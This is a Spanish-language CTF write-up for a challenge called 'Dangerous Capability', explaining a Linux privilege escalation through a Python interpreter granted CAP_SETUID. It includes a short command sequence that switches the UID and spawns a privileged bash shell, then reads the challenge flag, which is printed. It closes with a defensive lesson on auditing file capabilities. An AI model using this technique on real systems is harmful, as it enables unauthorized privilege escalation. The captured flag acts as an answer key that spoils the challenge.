# Dangerous Capability

[Índice de writeups](../README.md) · [Catálogo completo](../../catalogo/README.md)

**Categoría:** Hostbusters · **Puntos en el catálogo:** 300 · **Estado:** Documentado

Analizar una capacidad Linux peligrosa asignada a un intérprete dentro del host del CTF.
Evidencia: Documentado en la sesión

Herramientas: Shell Linux y Python con CAP_SETUID


## Procedimiento

1. Revisar las capacidades de archivos del laboratorio. Una capacidad permite conceder privilegios concretos a
    un ejecutable sin marcarlo como un binario SUID tradicional.

2. Identificar /opt/crypto/pytool con CAP_SETUID. Un intérprete con esta capacidad puede cambiar su UID a
     otro valor permitido por el contexto de ejecución.

3. Comprobar en el sistema del reto qué usuario corresponde al UID 1006. La sesión lo relacionó con
    spookyboi.

4. Invocar el intérprete para cambiar el UID y abrir una shell que conserve el contexto resultante. Ejecutar id
     inmediatamente después para verificar el cambio efectivo.

5. Leer la bandera del directorio de spookyboi y conservar el comando y la salida. No atribuir este resultado al
     reto de acceso inicial.


## Comandos o lógica reproducible

```text
# Exclusivamente en el host de laboratorio del reto.
getcap /opt/crypto/pytool
getent passwd 1006
/opt/crypto/pytool -c 'import os; os.setuid(1006); os.execl("/bin/bash","bash","-p")'
id
cat /home/spookyboi/flag.txt


```

## Resultado conservado

```text
deadface{c4p_s3tu1d_pwn3d}

```

## Por qué funciona

CAP_SETUID sobre un intérprete expone la capacidad a código arbitrario ejecutado por ese intérprete. El
permiso deja de estar limitado a una función pequeña y controlada.


## Aprendizaje para el análisis

Asignar capacidades solo a programas cuya superficie de ejecución esté acotada y auditar periódicamente
esos atributos.


## Alcance de la reconstrucción

La asociación con Dangerous Capability se conserva por la técnica y el nombre del reto; un resumen previo la etiquetó erróneamente
como Foothold on Charon.

---

Fuente: bitácora técnica personal, edición del 19 de octubre de 2026, ficha 17, página 28. Adaptación a Markdown; no constituye una nueva ejecución ni una nueva aceptación en CTFd. Los datos técnicos pertenecen al escenario del CTF.
